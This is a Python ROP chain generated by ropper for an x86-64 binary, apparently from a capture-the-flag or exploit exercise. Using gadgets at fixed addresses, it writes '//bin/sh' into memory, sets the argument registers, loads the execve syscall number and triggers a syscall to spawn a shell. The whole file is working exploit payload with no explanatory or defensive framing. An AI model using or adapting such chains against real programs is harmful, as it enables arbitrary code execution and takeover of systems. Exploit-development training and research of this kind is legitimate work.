# Generated by ropper ropchain generator #
from struct import pack

p = lambda x : pack('Q', x)

IMAGE_BASE_0 = 0x0000000000400000 # ade64b8e2c92beb177482f34ab4559d706125611b44863ba4baced1583a76ed6
rebase_0 = lambda x : p(x + IMAGE_BASE_0)

rop = b''

rop += rebase_0(0x000000000000e3fb) # 0x000000000040e3fb: pop r13; ret; 
rop += b'//bin/sh'
rop += rebase_0(0x00000000000006a6) # 0x00000000004006a6: pop rdi; ret; 
rop += rebase_0(0x00000000002d50e0)
rop += rebase_0(0x00000000000693d9) # 0x00000000004693d9: mov qword ptr [rdi], r13; pop rbx; pop rbp; pop r12; pop r13; ret; 
rop += p(0xdeadbeefdeadbeef)
rop += p(0xdeadbeefdeadbeef)
rop += p(0xdeadbeefdeadbeef)
rop += p(0xdeadbeefdeadbeef)
rop += rebase_0(0x000000000000e3fb) # 0x000000000040e3fb: pop r13; ret; 
rop += p(0x0000000000000000)
rop += rebase_0(0x00000000000006a6) # 0x00000000004006a6: pop rdi; ret; 
rop += rebase_0(0x00000000002d50e8)
rop += rebase_0(0x00000000000693d9) # 0x00000000004693d9: mov qword ptr [rdi], r13; pop rbx; pop rbp; pop r12; pop r13; ret; 
rop += p(0xdeadbeefdeadbeef)
rop += p(0xdeadbeefdeadbeef)
rop += p(0xdeadbeefdeadbeef)
rop += p(0xdeadbeefdeadbeef)
rop += rebase_0(0x00000000000006a6) # 0x00000000004006a6: pop rdi; ret; 
rop += rebase_0(0x00000000002d50e0)
rop += rebase_0(0x0000000000010ea3) # 0x0000000000410ea3: pop rsi; ret; 
rop += rebase_0(0x00000000002d50e8)
rop += rebase_0(0x000000000004ca96) # 0x000000000044ca96: pop rdx; ret; 
rop += rebase_0(0x00000000002d50e8)
rop += rebase_0(0x0000000000016314) # 0x0000000000416314: pop rax; ret; 
rop += p(0x000000000000003b)
rop += rebase_0(0x000000000007df85) # 0x000000000047df85: syscall; ret; 